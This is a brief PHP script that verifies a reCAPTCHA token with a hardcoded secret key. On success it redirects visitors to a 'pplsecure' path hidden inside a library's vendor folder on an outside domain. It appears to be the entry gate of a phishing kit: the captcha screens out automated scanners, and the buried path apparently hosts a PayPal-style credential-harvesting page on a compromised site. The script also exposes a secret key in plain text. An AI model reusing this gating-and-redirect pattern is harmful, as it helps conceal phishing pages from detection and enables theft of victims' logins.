<?php
$secretKey = "6LdOaF8aAAAAAIQTS840A29ZfxtCF9LK4Ae80E_Q";
        $captcha;
        if(isset($_POST['g-recaptcha-response'])){
          $captcha=$_POST['g-recaptcha-response'];
        }
        if(!$captcha){
          header('Location: captcha.php');
          exit;
        }
        $ip = $_SERVER['REMOTE_ADDR'];
        // post request to server
        $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) .  '&response=' . urlencode($captcha);
        $response = file_get_contents($url);
        $responseKeys = json_decode($response,true);
        // should return JSON with success as true
        if($responseKeys["success"]) {
                 header('Location: https://stardreamzz.com/vendor/ramsey/uuid/src/Converter/Number/pplsecure');
        } else {
                header('Location: captcha.php');
        }
?>